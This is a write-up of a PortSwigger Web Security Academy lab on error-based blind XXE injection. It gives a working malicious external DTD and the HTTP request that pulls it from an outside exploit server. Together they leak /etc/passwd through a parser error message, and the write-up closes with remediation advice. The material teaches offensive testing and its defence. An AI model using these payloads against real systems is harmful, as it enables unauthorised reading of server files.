# XXE Injection: Exploiting Blind XXE to Retrieve Data via Error Messages

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Blind XML External Entity Injection, Error-Based Data Exfiltration (CWE-611)

## Lab Objective
The "Check stock" feature parses XML but never displays the result. Host a malicious external DTD on the lab's exploit server and use it to deliberately trigger an XML parsing error whose message contains the full contents of `/etc/passwd`.

## Vulnerability Overview
The previous labs in this series confirmed blind XXE purely via out-of-band network interaction — proving the parser resolves external entities, without extracting any actual data. This lab goes a step further: it demonstrates that **even when a response contains no data fields and no out-of-band channel is usable**, data can still be exfiltrated by deliberately engineering a parsing error whose message happens to embed the target file's contents.

This relies on a specific, somewhat obscure quirk of the XML specification: a parameter entity's value **can reference another entity inline**, and if that inline reference resolves to something that isn't a syntactically valid value for its context — such as using file contents as part of a file path — the parser throws an error, and many parsers include the offending (invalid) value directly in that error message. By carefully nesting entities, an attacker can force the *file's contents themselves* to become the invalid value, so the parser's own error message leaks exactly what was being read.

The exploit chain works in three stages, all defined inside a single externally-hosted DTD:
1. Read the target file into a parameter entity.
2. Use that entity's value to construct an intentionally invalid file path (one the server almost certainly doesn't have).
3. Attempt to load that invalid path as yet another external entity — causing a failure, with the file's contents embedded directly in the resulting error.

## Methodology
1. **Confirm blind XXE exists**, as established in the prior labs — submitting invalid input produces no reflected data, ruling out in-band exploitation.
2. **Host a malicious external DTD** on the lab's dedicated exploit server, since the payload needs to live somewhere the target server can fetch it from.
3. **Construct the DTD using nested parameter entities** to read the target file and smuggle its contents into a deliberately malformed file path.
4. **Invoke the external DTD** from the vulnerable endpoint using the now-familiar parameter-entity pattern, pointing at the hosted DTD's URL.
5. **Read the resulting error message**, which should now contain the file's contents verbatim.

---

## Exploitation

**Step 1:** Click "Go to exploit server" and save the following as the hosted file content:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

This DTD performs three steps in sequence:
- **`% file`** reads `/etc/passwd` into a parameter entity.
- **`% eval`** dynamically defines a *second* parameter entity, `exfil`, whose `SYSTEM` identifier is built by concatenating the string `file:///invalid/` with the resolved value of `%file;` — i.e. the actual contents of `/etc/passwd`. The `&#x25;` is the numeric character reference for `%`, required here because a literal `%` can't be used directly inside this nested declaration without being misinterpreted by the parser as the start of another entity reference.
- **`%eval;`** then **`%exfil;`** trigger evaluation: first defining `exfil`, then referencing it — which forces the parser to attempt loading a file path that now has the entire contents of `/etc/passwd` appended to it.

**Step 2:** Click "View exploit" and note the hosted DTD's URL, e.g.:

```
https://exploit-ID.exploit-server.net/exploit.dtd
```

**Step 3:** Intercept the stock-check request in Burp Suite and send it to **Repeater**:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Step 4:** Replace the body with a payload that invokes the hosted DTD via a parameter entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "https://exploit-ID.exploit-server.net/exploit.dtd">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Step 5:** Send the request. The server fetches and interprets the hosted DTD inline, executing its three-stage entity chain. Since `/invalid/<contents-of-/etc/passwd>` is not a valid or existing file path, the parser throws an error — and critically, includes the attempted (invalid) path in its error message:

```
java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Step 6:** The error message, now containing the full contents of `/etc/passwd`, confirms successful exfiltration and solves the lab.

**Why it works:** The root vulnerability is identical to every prior lab — external entity resolution is enabled. What's novel is the *exfiltration channel*: rather than relying on a response field or an outbound network callback, the exploit manufactures a guaranteed parsing failure whose error message is forced to contain the secret data, by embedding the file's contents inside a string the parser then tries (and fails) to use as a path. This is a loophole in how parameter entity values are dynamically constructed and later dereferenced — the parser faithfully substitutes `%file;` into the new entity definition character-for-character, with no awareness that the result will later be used in a context (a file path) where arbitrary file contents are nonsensical and will visibly leak in the resulting error.

## Impact
- **Full data exfiltration even in strictly blind, OOB-blocked scenarios** — this technique works when neither in-band reflection nor out-of-band network callbacks are available, making it the most broadly applicable blind XXE exfiltration method covered in this series so far.
- **Error messages become a legitimate data exfiltration channel**, not just a debugging inconvenience — verbose parser errors that include attempted values are a direct information disclosure risk whenever external entity resolution is possible.
- **Demonstrates that disabling out-of-band egress alone is an incomplete mitigation** — an environment that firewalls off external network calls (as some real-world hardened environments do) is still vulnerable to this technique, since no network interaction outside the original request/response pair is required once the malicious DTD is reachable.
- **Reusable technique pattern:** the nested-entity "nonexistent path" trick generalizes to any file whose contents don't contain characters that would themselves break the resulting path syntax (notably, this technique can struggle with files containing newlines, depending on the parser and OS — a detail worth testing against the target file in real engagements).

## Remediation
- **Disable DTD processing and external entity resolution entirely at the parser configuration level.** This single fix prevents every variant covered across this entire lab series — in-band, OOB-blind, and error-based — since none of them function without DTD/external entity support in the first place.
- **Suppress verbose parser error messages in production.** Even with external entities disabled as the primary fix, returning raw parser exceptions to the client is poor practice in general and would have independently prevented this specific technique from working.
- **Apply network egress controls as defense-in-depth, not a primary fix.** This lab is proof that blocking outbound network calls does not fully close off blind XXE exfiltration — the error-based channel operates entirely within the original request/response cycle.
- **Host and review any DTD-processing logic with the assumption that attacker-controlled external DTDs will be loaded if reachable** — the fact that this whole technique depends on the server fetching an attacker-hosted DTD underscores why external entity resolution being enabled at all is the fundamental flaw being exploited.

## Key Takeaways
- Blind doesn't mean unexploitable, and OOB-blocked doesn't mean unexploitable either — this lab closes the loop on blind XXE by showing a technique that needs neither reflection nor network egress.
- Numeric character references (`&#x25;` for `%`) are sometimes necessary inside nested entity declarations specifically to delay evaluation — writing a literal `%` in the wrong place causes premature or incorrect parsing, so understanding *why* the reference is needed (not just copying the payload) matters for adapting this technique to other targets.
- Verbose error messages are a recurring theme across this entire series (enumeration in the API testing labs, and now direct data leakage here) — consistently treating detailed error output as a security-relevant signal, both offensively and defensively, is a transferable skill well beyond XXE specifically.
- This technique's reliance on hosting an external DTD on attacker-controlled infrastructure (the exploit server) reinforces that strong egress filtering alone cannot be the sole defense — the fix always needs to live at the parser configuration layer.

## Tools Used
- Burp Suite (Proxy, Repeater)
- PortSwigger exploit server (DTD hosting)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.